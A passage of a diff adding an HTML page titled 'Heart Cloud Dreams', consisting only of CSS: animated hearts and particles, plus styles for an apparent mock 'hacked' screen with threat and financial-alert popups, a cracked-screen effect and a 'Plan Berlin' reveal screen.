@@ -1,0 +1,2496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Heart Cloud Dreams</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%, #ff6b6b 200%);
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+            animation: backgroundShift 10s ease-in-out infinite alternate;
+        }
+
+        @keyframes backgroundShift {
+            0% { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+            25% { background: linear-gradient(135deg, #764ba2 0%, #ff6b6b 100%); }
+            50% { background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%); }
+            75% { background: linear-gradient(135deg, #feca57 0%, #48dbfb 100%); }
+            100% { background: linear-gradient(135deg, #48dbfb 0%, #667eea 100%); }
+        }
+
+        /* Animated background particles */
+        .bg-particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+        }
+
+        /* Main container */
+        .container {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .title {
+            color: white;
+            font-size: 3.5rem;
+            font-weight: 300;
+            text-align: center;
+            margin-bottom: 2rem;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            animation: glow 2s ease-in-out infinite alternate, rainbow 8s linear infinite;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #ffeaa7, #dda0dd);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        @keyframes rainbow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5), 0 0 30px rgba(255, 255, 255, 0.3); }
+            to { text-shadow: 0 0 30px rgba(255, 255, 255, 0.8), 0 0 40px rgba(255, 255, 255, 0.5); }
+        }
+
+        .input-container {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 3rem;
+            align-items: center;
+        }
+
+        .text-input {
+            padding: 15px 25px;
+            font-size: 1.2rem;
+            border: none;
+            border-radius: 50px;
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            min-width: 300px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .text-input:focus {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 1);
+        }
+
+        .create-btn {
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e, #feca57, #ff9ff3);
+            background-size: 300% 300%;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.3), 0 0 50px rgba(255, 107, 107, 0.2);
+            transition: all 0.3s ease;
+            font-weight: 600;
+            animation: buttonGlow 3s ease-in-out infinite alternate, gradientShift 4s ease infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .create-btn::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #ff6b6b);
+            border-radius: 50px;
+            z-index: -1;
+            animation: borderGlow 2s linear infinite;
+        }
+
+        @keyframes buttonGlow {
+            from { box-shadow: 0 10px 30px rgba(255, 107, 107, 0.3), 0 0 50px rgba(255, 107, 107, 0.2); }
+            to { box-shadow: 0 15px 40px rgba(255, 107, 107, 0.6), 0 0 80px rgba(255, 107, 107, 0.4); }
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes borderGlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .create-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255, 107, 107, 0.5);
+            background: linear-gradient(45deg, #ff5252, #ff7979);
+        }
+
+        .create-btn:active {
+            transform: translateY(-1px);
+        }
+
+        /* Heart cloud container */
+        .heart-cloud-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .heart-cloud {
+            position: absolute;
+            font-size: 2rem;
+            color: #ff6b6b;
+            animation: heartFloat 15s linear infinite;
+            text-shadow: 0 0 10px rgba(255, 107, 107, 0.8);
+            opacity: 0;
+        }
+
+        @keyframes heartFloat {
+            0% {
+                opacity: 0;
+                transform: translateY(100vh) scale(0.5) rotate(0deg);
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-100px) scale(1.2) rotate(360deg);
+            }
+        }
+
+        .heart-text {
+            position: absolute;
+            font-size: 1.5rem;
+            color: white;
+            font-weight: 300;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
+            animation: textFloat 12s linear infinite;
+            opacity: 0;
+            white-space: nowrap;
+        }
+
+        @keyframes textFloat {
+            0% {
+                opacity: 0;
+                transform: translateY(100vh) translateX(-50px) scale(0.8);
+            }
+            15% {
+                opacity: 1;
+            }
+            85% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-100px) translateX(50px) scale(1.1);
+            }
+        }
+
+        /* Sparkle effects */
+        .sparkle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: white;
+            border-radius: 50%;
+            animation: sparkle 3s linear infinite;
+        }
+
+        @keyframes sparkle {
+            0%, 100% { opacity: 0; transform: scale(0); }
+            50% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Crack effect styles */
+        .crack-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: transparent;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .crack {
+            position: absolute;
+            background: linear-gradient(45deg, rgba(0,0,0,0.8), rgba(50,50,50,0.9), rgba(0,0,0,0.8));
+            transform-origin: top;
+            animation: crackGrow 0.5s ease-out forwards;
+            box-shadow: 
+                0 0 10px rgba(0,0,0,0.8),
+                inset 0 0 5px rgba(255,255,255,0.1),
+                0 0 20px rgba(0,0,0,0.6);
+        }
+
+        @keyframes crackGrow {
+            from {
+                height: 0;
+                opacity: 0;
+            }
+            to {
+                height: var(--crack-height);
+                opacity: 1;
+            }
+        }
+
+        .frozen {
+            animation-play-state: paused !important;
+        }
+
+        .frozen * {
+            animation-play-state: paused !important;
+            transition: none !important;
+        }
+
+        .screen-shatter {
+            filter: contrast(1.5) brightness(0.8) saturate(0.5);
+            animation: shatter 1s ease-out forwards;
+        }
+
+        @keyframes shatter {
+            0% { filter: contrast(1.5) brightness(0.8) saturate(0.5); }
+            50% { filter: contrast(2) brightness(0.6) saturate(0.3) blur(1px); }
+            100% { filter: contrast(1.8) brightness(0.5) saturate(0.2) blur(2px); }
+        }
+
+        /* Hacking screen styles */
+        .hack-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            z-index: 99999;
+            display: none;
+            overflow: hidden;
+        }
+
+        .hack-screen.active {
+            display: block;
+            animation: hackScreenGlitch 0.5s infinite;
+        }
+
+        @keyframes hackScreenGlitch {
+            0%, 90%, 100% { transform: translate(0); }
+            10% { transform: translate(-2px, 1px); }
+            20% { transform: translate(2px, -1px); }
+            30% { transform: translate(-1px, 2px); }
+            40% { transform: translate(1px, -2px); }
+            50% { transform: translate(-2px, -1px); }
+            60% { transform: translate(2px, 1px); }
+            70% { transform: translate(-1px, -2px); }
+            80% { transform: translate(1px, 2px); }
+        }
+
+        .hack-header {
+            text-align: center;
+            font-size: 3rem;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            animation: hackPulse 1s infinite, hackGlitch 0.1s infinite;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+
+        @keyframes hackPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        @keyframes hackGlitch {
+            0%, 98%, 100% { 
+                text-shadow: 0 0 20px #ff0000;
+                color: #ff0000;
+            }
+            1%, 3%, 5%, 7%, 9% {
+                text-shadow: 0 0 20px #00ff00;
+                color: #00ff00;
+            }
+            2%, 4%, 6%, 8% {
+                text-shadow: 0 0 20px #0000ff;
+                color: #0000ff;
+            }
+        }
+
+        .hack-content {
+            padding: 20px;
+            height: calc(100vh - 120px);
+            overflow: hidden;
+        }
+
+        .code-lines {
+            font-size: 14px;
+            line-height: 1.4;
+            animation: scrollUp 0.1s linear infinite;
+        }
+
+        @keyframes scrollUp {
+            from { transform: translateY(0); }
+            to { transform: translateY(-20px); }
+        }
+
+        .threat-message {
+            position: absolute;
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 15px 25px;
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            animation: threatPop 0.5s ease-out, threatPulse 2s infinite;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
+            z-index: 100000;
+        }
+
+        @keyframes threatPop {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes threatPulse {
+            0%, 100% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.8); }
+            50% { box-shadow: 0 0 50px rgba(255, 0, 0, 1); }
+        }
+
+        .financial-alert {
+            position: absolute;
+            background: linear-gradient(45deg, #ff4444, #cc0000);
+            color: white;
+            padding: 12px 20px;
+            border-left: 5px solid #ffff00;
+            font-size: 15px;
+            font-weight: bold;
+            animation: financialSlide 0.8s ease-out, financialBlink 1.5s infinite;
+            box-shadow: 0 5px 20px rgba(255, 68, 68, 0.6);
+            z-index: 100001;
+        }
+
+        @keyframes financialSlide {
+            0% { transform: translateX(-100%); opacity: 0; }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes financialBlink {
+            0%, 50%, 100% { background: linear-gradient(45deg, #ff4444, #cc0000); }
+            25%, 75% { background: linear-gradient(45deg, #ffff00, #ff8800); }
+        }
+
+        .loading-bar {
+            position: absolute;
+            bottom: 50px;
+            left: 50px;
+            right: 50px;
+            height: 30px;
+            background: #333;
+            border: 2px solid #00ff00;
+            border-radius: 15px;
+            overflow: hidden;
+        }
+
+        .loading-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00);
+            width: 0;
+            animation: loadingProgress 8s linear forwards;
+            border-radius: 13px;
+        }
+
+        @keyframes loadingProgress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .loading-text {
+            position: absolute;
+            bottom: 90px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #00ff00;
+            font-size: 18px;
+            font-weight: bold;
+            animation: loadingTextBlink 1s infinite;
+        }
+
+        @keyframes loadingTextBlink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+
+        /* Enhanced animations for better effects */
+        @keyframes screenShake {
+            0%, 100% { transform: translateX(0); }
+            10% { transform: translateX(-5px) translateY(2px); }
+            20% { transform: translateX(5px) translateY(-2px); }
+            30% { transform: translateX(-3px) translateY(3px); }
+            40% { transform: translateX(3px) translateY(-1px); }
+            50% { transform: translateX(-2px) translateY(1px); }
+            60% { transform: translateX(2px) translateY(-3px); }
+            70% { transform: translateX(-1px) translateY(2px); }
+            80% { transform: translateX(1px) translateY(-1px); }
+            90% { transform: translateX(-1px) translateY(1px); }
+        }
+
+        @keyframes staticNoise {
+            0% { opacity: 0.1; }
+            50% { opacity: 0.2; }
+            100% { opacity: 0.1; }
+        }
+
+        @keyframes hackScreenMegaGlitch {
+            0%, 90%, 100% { transform: translate(0); filter: hue-rotate(0deg); }
+            5% { transform: translate(-3px, 2px); filter: hue-rotate(90deg); }
+            10% { transform: translate(3px, -2px); filter: hue-rotate(180deg); }
+            15% { transform: translate(-2px, 3px); filter: hue-rotate(270deg); }
+            20% { transform: translate(2px, -3px); filter: hue-rotate(0deg); }
+        }
+
+        @keyframes rainbow-sparkle {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+
+        /* Enhanced particle types */
+        .mega-particle {
+            background: radial-gradient(circle, rgba(255,215,0,0.8), rgba(255,215,0,0.2)) !important;
+            animation: enhancedFloat 12s ease-in-out infinite !important;
+        }
+
+        .cosmic-particle {
+            background: radial-gradient(circle, rgba(138,43,226,0.8), rgba(138,43,226,0.2)) !important;
+            animation: enhancedFloat 15s ease-in-out infinite !important;
+        }
+
+        /* Plan Berlin Special Screen */
+        .planberlin-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(45deg, #667eea, #764ba2, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
+            background-size: 400% 400%;
+            animation: planberlinBackground 8s ease infinite;
+            z-index: 999999;
+            display: none;
+            overflow: hidden;
+        }
+
+        .planberlin-screen.active {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        @keyframes planberlinBackground {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .planberlin-container {
+            text-align: center;
+            animation: planberlinFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes planberlinFloat {
+            0%, 100% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-20px) scale(1.05); }
+        }
+
+        .planberlin-title {
+            font-size: 4rem;
+            color: white;
+            text-shadow: 
+                0 0 20px rgba(255,255,255,0.8),
+                0 0 40px rgba(255,255,255,0.6),
+                0 0 60px rgba(255,255,255,0.4);
+            margin-bottom: 30px;
+            animation: planberlinTitleGlow 2s ease-in-out infinite alternate;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #feca57, #ff9ff3);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: planberlinTitleGlow 2s ease-in-out infinite alternate, planberlinRainbow 4s linear infinite;
+        }
+
+        @keyframes planberlinTitleGlow {
+            from { 
+                text-shadow: 
+                    0 0 20px rgba(255,255,255,0.8),
+                    0 0 40px rgba(255,255,255,0.6),
+                    0 0 60px rgba(255,255,255,0.4);
+            }
+            to { 
+                text-shadow: 
+                    0 0 30px rgba(255,255,255,1),
+                    0 0 60px rgba(255,255,255,0.8),
+                    0 0 90px rgba(255,255,255,0.6);
+            }
+        }
+
+        @keyframes planberlinRainbow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .planberlin-image-container {
+            position: relative;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 
+                0 20px 60px rgba(0,0,0,0.3),
+                0 0 80px rgba(255,255,255,0.2),
+                inset 0 0 0 3px rgba(255,255,255,0.3);
+            animation: planberlinImagePulse 3s ease-in-out infinite;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border: 3px solid rgba(255,255,255,0.3);
+        }
+
+        @keyframes planberlinImagePulse {
+            0%, 100% {
+                box-shadow: 
+                    0 20px 60px rgba(0,0,0,0.3),
+                    0 0 80px rgba(255,255,255,0.2),
+                    inset 0 0 0 3px rgba(255,255,255,0.3);
+            }
+            50% {
+                box-shadow: 
+                    0 30px 80px rgba(0,0,0,0.4),
+                    0 0 120px rgba(255,255,255,0.4),
+                    inset 0 0 0 5px rgba(255,255,255,0.5);
+            }
+        }
+
+        .planberlin-image {
+            width: 600px;
+            height: auto;
+            max-width: 90vw;
+            display: block;
+            border-radius: 17px;
+            animation: planberlinImageGlow 4s ease-in-out infinite;
+        }
+
+        @keyframes planberlinImageGlow {
+            0%, 100% { filter: brightness(1) saturate(1.2) contrast(1.1); }
+            50% { filter: brightness(1.1) saturate(1.4) contrast(1.2) drop-shadow(0 0 30px rgba(255,255,255,0.5)); }
+        }
+
+        .planberlin-sparkles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .planberlin-sparkle {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background: white;
+            border-radius: 50%;
+            animation: planberlinSparkleFloat 3s linear infinite;
+        }
+
+        @keyframes planberlinSparkleFloat {
+            0% {
+                opacity: 0;
+                transform: translateY(100px) scale(0);
+            }
+            10% {
+                opacity: 1;
+                transform: translateY(80px) scale(1);
+            }
+            90% {
+                opacity: 1;
+                transform: translateY(-80px) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-100px) scale(0);
+            }
+        }
+
+        .planberlin-subtitle {
+            color: white;
+            font-size: 1.5rem;
+            margin-top: 20px;
+            text-shadow: 0 0 15px rgba(255,255,255,0.8);
+            animation: planberlinSubtitlePulse 2s ease-in-out infinite alternate;
+            font-weight: 300;
+        }
+
+        @keyframes planberlinSubtitlePulse {
+            from { opacity: 0.8; }
+            to { opacity: 1; }
+        }
+
+        /* Crack Discovery Animation */
+        .crack-discovery {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: radial-gradient(circle, rgba(255,215,0,0.1) 0%, rgba(0,0,0,0.8) 100%);
+            z-index: 888888;
+            display: none;
+            animation: crackDiscoveryReveal 3s ease-out forwards;
+        }
+
+        .crack-discovery.active {
+            display: block;
+        }
+
+        @keyframes crackDiscoveryReveal {
+            0% {
+                background: radial-gradient(circle, rgba(255,215,0,0) 0%, rgba(0,0,0,1) 100%);
+                transform: scale(10);
+            }
+            50% {
+                background: radial-gradient(circle, rgba(255,215,0,0.3) 30%, rgba(0,0,0,0.9) 100%);
+                transform: scale(3);
+            }
+            100% {
+                background: radial-gradient(circle, rgba(255,215,0,0.1) 50%, rgba(0,0,0,0.7) 100%);
+                transform: scale(1);
+            }
+        }
+
+        .discovery-crack {
+            position: absolute;
+            background: linear-gradient(45deg, 
+                rgba(255,215,0,1) 0%, 
+                rgba(255,255,255,0.9) 20%, 
+                rgba(255,215,0,0.8) 40%,
+                rgba(255,255,255,0.7) 60%,
+                rgba(255,215,0,0.6) 80%,
+                rgba(255,255,255,0.4) 100%);
+            transform-origin: top;
+            animation: discoveryCrackGrow 2s ease-out forwards;
+            box-shadow: 
+                0 0 20px rgba(255,215,0,0.8),
+                0 0 40px rgba(255,215,0,0.6),
+                0 0 60px rgba(255,215,0,0.4);
+            filter: drop-shadow(0 0 10px rgba(255,215,0,0.8));
+        }
+
+        @keyframes discoveryCrackGrow {
+            0% {
+                height: 0;
+                opacity: 0;
+                width: 1px;
+            }
+            30% {
+                height: var(--discovery-crack-height);
+                opacity: 1;
+                width: 3px;
+            }
+            100% {
+                height: var(--discovery-crack-height);
+                opacity: 0.8;
+                width: 2px;
+            }
+        }
+
+        .golden-particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .golden-particle {
+            position: absolute;
+            background: radial-gradient(circle, rgba(255,215,0,1) 0%, rgba(255,215,0,0) 70%);
+            border-radius: 50%;
+            animation: goldenParticleFloat 4s ease-out forwards;
+        }
+
+        @keyframes goldenParticleFloat {
+            0% {
+                opacity: 0;
+                transform: scale(0) translateY(0) rotate(0deg);
+            }
+            20% {
+                opacity: 1;
+                transform: scale(1.5) translateY(-20px) rotate(90deg);
+            }
+            100% {
+                opacity: 0;
+                transform: scale(0.5) translateY(-100px) rotate(360deg);
+            }
+        }
+
+        /* Enhanced Plan Berlin Screen */
+        .planberlin-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(120, 198, 198, 0.3) 0%, transparent 50%),
+                linear-gradient(45deg, #667eea, #764ba2, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
+            background-size: 400% 400%;
+            animation: planberlinMegaBackground 12s ease infinite;
+            z-index: 999999;
+            display: none;
+            overflow: hidden;
+        }
+
+        .planberlin-screen.active {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: planberlinScreenReveal 2s ease-out forwards;
+        }
+
+        @keyframes planberlinScreenReveal {
+            0% {
+                opacity: 0;
+                transform: scale(0.5) rotate(10deg);
+                filter: blur(20px);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(1.1) rotate(-2deg);
+                filter: blur(5px);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1) rotate(0deg);
+                filter: blur(0px);
+            }
+        }
+
+        @keyframes planberlinMegaBackground {
+            0% { 
+                background-position: 0% 50%;
+                filter: hue-rotate(0deg) brightness(1);
+            }
+            25% { 
+                background-position: 100% 50%;
+                filter: hue-rotate(90deg) brightness(1.2);
+            }
+            50% { 
+                background-position: 100% 100%;
+                filter: hue-rotate(180deg) brightness(1.1);
+            }
+            75% { 
+                background-position: 0% 100%;
+                filter: hue-rotate(270deg) brightness(1.3);
+            }
+            100% { 
+                background-position: 0% 50%;
+                filter: hue-rotate(360deg) brightness(1);
+            }
+        }
+
+        .planberlin-container {
+            text-align: center;
+            animation: planberlinMegaFloat 4s ease-in-out infinite;
+            position: relative;
+        }
+
+        @keyframes planberlinMegaFloat {
+            0%, 100% { 
+                transform: translateY(0px) scale(1) rotateY(0deg); 
+            }
+            25% {
+                transform: translateY(-30px) scale(1.02) rotateY(5deg);
+            }
+            50% { 
+                transform: translateY(-15px) scale(1.05) rotateY(0deg); 
+            }
+            75% {
+                transform: translateY(-25px) scale(1.03) rotateY(-5deg);
+            }
+        }
+
+        .planberlin-title {
+            font-size: 5rem;
+            color: white;
+            text-shadow: 
+                0 0 30px rgba(255,255,255,1),
+                0 0 60px rgba(255,255,255,0.8),
+                0 0 90px rgba(255,215,0,0.6),
+                0 0 120px rgba(255,215,0,0.4);
+            margin-bottom: 40px;
+            animation: 
+                planberlinMegaTitleGlow 3s ease-in-out infinite alternate,
+                planberlinMegaRainbow 6s linear infinite,
+                planberlinTitleBounce 4s ease-in-out infinite;
+            font-weight: bold;
+            background: linear-gradient(45deg, 
+                #ff6b6b, #4ecdc4, #45b7d1, #feca57, #ff9ff3, #ff6b6b, 
+                #4ecdc4, #45b7d1, #feca57, #ff9ff3);
+            background-size: 500% 500%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            transform-style: preserve-3d;
+        }
+
+        @keyframes planberlinTitleBounce {
+            0%, 100% { transform: translateY(0) rotateX(0deg); }
+            50% { transform: translateY(-10px) rotateX(5deg); }
+        }
+
+        @keyframes planberlinMegaTitleGlow {
+            from { 
+                text-shadow: 
+                    0 0 30px rgba(255,255,255,1),
+                    0 0 60px rgba(255,255,255,0.8),
+                    0 0 90px rgba(255,215,0,0.6),
+                    0 0 120px rgba(255,215,0,0.4);
+            }
+            to { 
+                text-shadow: 
+                    0 0 50px rgba(255,255,255,1),
+                    0 0 100px rgba(255,255,255,1),
+                    0 0 150px rgba(255,215,0,0.8),
+                    0 0 200px rgba(255,215,0,0.6);
+            }
+        }
+
+        @keyframes planberlinMegaRainbow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .planberlin-image-container {
+            position: relative;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 
+                0 30px 80px rgba(0,0,0,0.4),
+                0 0 100px rgba(255,255,255,0.3),
+                0 0 150px rgba(255,215,0,0.5),
+                inset 0 0 0 5px rgba(255,255,255,0.4);
+            animation: 
+                planberlinMegaImagePulse 4s ease-in-out infinite,
+                planberlinImageRotate 20s linear infinite;
+            background: 
+                linear-gradient(45deg, 
+                    rgba(255,255,255,0.1), 
+                    rgba(255,215,0,0.1), 
+                    rgba(255,255,255,0.1));
+            backdrop-filter: blur(20px) saturate(2);
+            border: 5px solid;
+            border-image: linear-gradient(45deg, 
+                rgba(255,255,255,0.6), 
+                rgba(255,215,0,0.8), 
+                rgba(255,255,255,0.6)) 1;
+            transform-style: preserve-3d;
+        }
+
+        @keyframes planberlinImageRotate {
+            0% { transform: perspective(1000px) rotateY(0deg) rotateX(0deg); }
+            25% { transform: perspective(1000px) rotateY(5deg) rotateX(2deg); }
+            50% { transform: perspective(1000px) rotateY(0deg) rotateX(0deg); }
+            75% { transform: perspective(1000px) rotateY(-5deg) rotateX(-2deg); }
+            100% { transform: perspective(1000px) rotateY(0deg) rotateX(0deg); }
+        }
+
+        @keyframes planberlinMegaImagePulse {
+            0%, 100% {
+                box-shadow: 
+                    0 30px 80px rgba(0,0,0,0.4),
+                    0 0 100px rgba(255,255,255,0.3),
+                    0 0 150px rgba(255,215,0,0.5),
+                    inset 0 0 0 5px rgba(255,255,255,0.4);
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 
+                    0 40px 120px rgba(0,0,0,0.5),
+                    0 0 150px rgba(255,255,255,0.5),
+                    0 0 200px rgba(255,215,0,0.8),
+                    inset 0 0 0 8px rgba(255,255,255,0.6);
+                transform: scale(1.05);
+            }
+        }
+
+        .planberlin-image {
+            width: 700px;
+            height: auto;
+            max-width: 90vw;
+            display: block;
+            border-radius: 20px;
+            animation: 
+                planberlinMegaImageGlow 5s ease-in-out infinite,
+                planberlinImageFloat 6s ease-in-out infinite;
+            transition: all 0.3s ease;
+        }
+
+        @keyframes planberlinImageFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes planberlinMegaImageGlow {
+            0%, 100% { 
+                filter: brightness(1.1) saturate(1.3) contrast(1.2) hue-rotate(0deg); 
+            }
+            25% {
+                filter: brightness(1.2) saturate(1.5) contrast(1.3) hue-rotate(10deg) drop-shadow(0 0 30px rgba(255,215,0,0.6));
+            }
+            50% { 
+                filter: brightness(1.3) saturate(1.4) contrast(1.4) hue-rotate(0deg) drop-shadow(0 0 50px rgba(255,255,255,0.8)); 
+            }
+            75% {
+                filter: brightness(1.2) saturate(1.5) contrast(1.3) hue-rotate(-10deg) drop-shadow(0 0 30px rgba(255,215,0,0.6));
+            }
+        }
+
+        /* Cinematic sequence styles */
+        .cinematic-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(135deg, #000000 0%, #1a0000 50%, #000000 100%);
+            z-index: 9999999;
+            display: none;
+            opacity: 0;
+        }
+
+        .cinematic-overlay.active {
+            display: block !important;
+            animation: darkCinematicFadeIn 2s ease-out forwards;
+        }
+
+        @keyframes darkCinematicFadeIn {
+            0% { 
+                opacity: 0;
+                transform: scale(1.1);
+                filter: brightness(0.5);
+            }
+            100% { 
+                opacity: 1;
+                transform: scale(1);
+                filter: brightness(0.8) contrast(1.2);
+            }
+        }
+
+        .eraser-wave {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, transparent 0%, #000000 40%, #330000 70%, #000000 100%);
+            animation: dangerousEraserExpand 4s ease-out forwards;
+        }
+
+        @keyframes dangerousEraserExpand {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+                filter: brightness(0.3);
+            }
+            30% {
+                transform: scale(1.5);
+                opacity: 0.6;
+                filter: brightness(0.5) contrast(1.5);
+            }
+            100% {
+                transform: scale(3);
+                opacity: 1;
+                filter: brightness(0.8) contrast(1.8) saturate(0.5);
+            }
+        }
+
+        .portrait-container {
+            position: absolute;
+            top: 50%;
+            left: -500px;
+            transform: translateY(-50%);
+            z-index: 10000001;
+            display: none;
+        }
+
+        .portrait-container.active {
+            display: block;
+            animation: portraitFlyIn 4s ease-out forwards;
+        }
+
+        @keyframes portraitFlyIn {
+            0% {
+                left: -500px;
+                transform: translateY(-50%) scale(0.3) rotateY(45deg);
+                opacity: 0;
+            }
+            60% {
+                left: 20%;
+                transform: translateY(-50%) scale(0.8) rotateY(10deg);
+                opacity: 0.8;
+            }
+            100% {
+                left: 15%;
+                transform: translateY(-50%) scale(1) rotateY(0deg);
+                opacity: 1;
+            }
+        }
+
+        .image-container-cinematic {
+            position: absolute;
+            top: 50%;
+            right: -500px;
+            transform: translateY(-50%);
+            z-index: 10000001;
+            display: none;
+        }
+
+        .image-container-cinematic.active {
+            display: block;
+            animation: imageFlyIn 4s ease-out forwards;
+        }
+
+        @keyframes imageFlyIn {
+            0% {
+                right: -500px;
+                transform: translateY(-50%) scale(0.3) rotateY(-45deg);
+                opacity: 0;
+            }
+            60% {
+                right: 20%;
+                transform: translateY(-50%) scale(0.8) rotateY(-10deg);
+                opacity: 0.8;
+            }
+            100% {
